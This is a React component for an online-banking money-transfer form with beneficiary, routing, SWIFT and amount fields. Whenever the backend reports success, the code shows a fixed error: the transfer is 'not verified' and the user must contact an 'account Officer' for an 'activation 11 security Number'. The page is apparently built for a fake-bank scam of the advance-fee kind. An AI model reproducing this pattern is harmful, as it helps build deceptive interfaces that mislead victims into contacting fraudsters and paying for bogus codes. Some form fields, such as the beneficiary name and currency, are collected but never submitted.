import React, { useState } from "react";
import { Link, Redirect } from "react-router-dom";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { Spin } from "antd";
import { LoadingOutlined } from "@ant-design/icons";

import { transfer} from "../function/transaction";

import UserNav from "../components/UserNav";

const Transfer= () => {

  const [values, setValues] = useState({
    name: "",
    accountNumber: "",
    amount: "",
    routingNumber: "",
    swift: "",
    summary: "",
    error: false,
    loading: false,
    success: "",
  });

const { name, accountNumber, amount, routingNumber, swift, summary,  loading, success, error } = values;

const handleChange = name => event => {
  setValues({ ...values, error: false, [name]: event.target.value });
};

const transferSubmit = event => {

  event.preventDefault();
  setValues({ ...values, error: false });
  toast.error(error);
  transfer({  accountNumber,  amount, routingNumber, swift, summary }).then(data => {
      if (data.error) {
          setValues({ ...values, error: data.error, success: true});
      } else {
          setValues({
            ...values,
            loading: false,
            success: true,
            error:
              "Transfer not verified. To complete transfer, Please contact your account Officer for your bank account activation 11 security Number",
          });
          // toast('Transfer not verified. To complete transfer, Please contact your account Officer for your account activation 11 security Number');
      }
      
  });
  };
  

    const antIcon = (
      <LoadingOutlined
        style={{ fontSize: 50, color: "#FD5D5D" }}
        spin
        delay={100}
      />
  );
  
  //  const showError = () => (
  //    <div
  //      className="modal-dialog modal-dialog-centered"
  //      style={{ display: error ? "" : "none" }}
  //    >
  //      {error}
  //    </div>
  //  );

  //  const showSuccess = () => (
  //    <div
  //      className="modal-dialog modal-dialog-centered"
  //      style={{ display: success ? "" : "none" }}
  //    >
  //      Transfer not verified. To complete transfer, Please contact your account
  //      Officer for your account activation 11 security Number
  //    </div>
  //  );

  
 

  return (
    <div>
      {/* <ToastContainer /> */}

      <UserNav />

      <div className="content-body">
        <div className="container">
          <div className="row">
            <div className="col-xl-12">
              <div className="page-title">
                <div className="row align-items-center justify-content-between">
                  <div className="col-xl-4"></div>
                </div>
              </div>
            </div>
            <div className="col-xxl-12">
              <h4 className="card-title mt-3 mb-4">
                Please verify account details before sending funds
              </h4>
              <div className="row">
                <div className="col-xxl-12">
                  <div className="card">
                    <div className="card-header">
                      <h4 className="card-title mt-2 mb-4">
                        Send Money In Minutes
                      </h4>
                    </div>
                    {/* {showSuccess()}
                    {showError()} */}
                    <div className="card-body">
                      {/* {loading ? (
                        <div className="text-center mt-5">
                          <Spin indicator={antIcon} />
                          <h4 className="text-dark">
                            Please Wait... verifying your transaction.
                          </h4>
                        </div>
                      ) : ( */}
                        <form action="#">
                          <div className="row g-3">
                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">
                                Benificiary Name
                              </label>
                              <input
                                type="text"
                                className="form-control"
                                placeholder="Benificiary Name"
                                onChange={handleChange("name")}
                                value={name}
                              />
                            </div>
                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">Currency</label>
                              <select className="form-select">
                                <option value>USD</option>
                                <option value>CAD</option>
                                <option value>Euro</option>
                              </select>
                            </div>
                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">
                                Benificiary routing Number
                              </label>
                              <input
                                type="text"
                                className="form-control"
                                placeholder="Benificiary Routing Number"
                                onChange={handleChange("routingNumber")}
                                value={routingNumber}
                              />
                            </div>

                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">
                                Benificiary Bank Swift code
                              </label>
                              <input
                                type="text"
                                className="form-control"
                                placeholder="Bank Swift code"
                                onChange={handleChange("swift")}
                                value={swift}
                              />
                            </div>

                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">
                                Benificiary Bank Account Number
                              </label>
                              <input
                                type="text"
                                className="form-control"
                                placeholder="Benificiary Account Number"
                                onChange={handleChange("accountNumber")}
                                value={accountNumber}
                              />
                            </div>

                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">Amount $</label>
                              <input
                                type="text"
                                className="form-control"
                                placeholder="Amount"
                                onChange={handleChange("amount")}
                                value={amount}
                              />
                            </div>

                            <div className="col-xxl-6 col-xl-6 col-lg-6 mb-3">
                              <label className="form-label">
                                Transfer Description
                              </label>
                              <textarea
                                className="form-control"
                                placeholder="Enter Transfer  Description"
                                onChange={handleChange("summary")}
                                value={summary}
                              />
                          </div>
                          
                              {error && <p className="text-danger">{error}</p>}
                              
                            <div className="col-12">
                              <button
                                className="btn btn-primary pl-5 pr-5 "
                                onClick={transferSubmit}
                              >
                                Send Money
                              </button>
                            </div>
                          </div>
                        </form>
                      {/* )} */}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Transfer;